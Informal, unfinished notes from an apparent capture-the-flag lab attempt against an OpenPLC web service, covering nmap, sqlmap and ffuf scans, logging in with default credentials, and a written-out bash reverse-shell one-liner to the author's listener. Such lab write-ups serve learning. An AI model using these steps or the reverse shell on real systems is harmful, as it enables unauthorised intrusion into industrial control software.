nmap scan states that Werkzeug is being used on port 8080. seems to be a web application server

port 22 is also open serving ssh


http://10.10.11.7:8080/login

must go to this link because it is serving on 8080

i have to exploit something on that webserver. probablyyyy the formmmm yeaaa


when i give it random creds  that dont work, i get a generic:

Bad credentials! Try again


lemme look through the source code

nothing interseting in the html


im gonna look up if theres any known vulns with the nmap scan details

oh okay so its using python and werkzeug to serve. i wanna know if theres vulns with werkzeug

https://security.snyk.io/vuln/SNYK-PYTHON-WERKZEUG-6808933

unfortunately cant use this cuz theres no one on the other end


gonna check if its sql injectable with the form. but while waiting i'll run ffuf

found no sql injections with sqlmap

found no sub doms

hopefully theres something in directory fuzzing cuz otherwise i have no clue

https://autonomylogic.com/docs/2-1-openplc-runtime-overview/

WHY THE HELL omg i shoulda looked at documentation first. DAMN ITTT omg this keeps happening.


okay the default creds areee:

The default username and password is openplc (login) and openplc (password). This means that the first thing you must do after logging in for the first time is change the default username and password! It is very easy to do that. Just go to the Users menu on the left and click on the OpenPLC User to change the user information as you like.

so now that im in i checked all the menu items

all seemed relating to the actual functioning of the PLC (programmable logic controller) and i didn't see any exploits there. there was however a file upload section in </>Programs

gonna try a reverse shell in bash. and then start the plc service to get the bash shell to execute. FIRST THOUGHHH DONT FORGET THAT U NEED TO CREATE A LISTENER FIRSTTTTTRFKSjgfsjbg


the plc uses linux according to the hardware section. i can definitely use a reverse shell here. i think. well that kinda defeats the whole definitely LMAO


alright

bash -i >& /dev/tcp/10.10.16.74/8000 0>&1

okay turns out i cant even upload it cuz it wants stupid st files

so turns out theres an exploit for openplc from 2021 that i might be able to use.

Encryption key: off. This means your connection on the wireless network is not encrypted and data is being transferred in plaintext. ESSID is just the wireless network name you are connected to.


wifi hacking? i dunno how to do this


The PMK is computed as follows:

so i need to get the password?
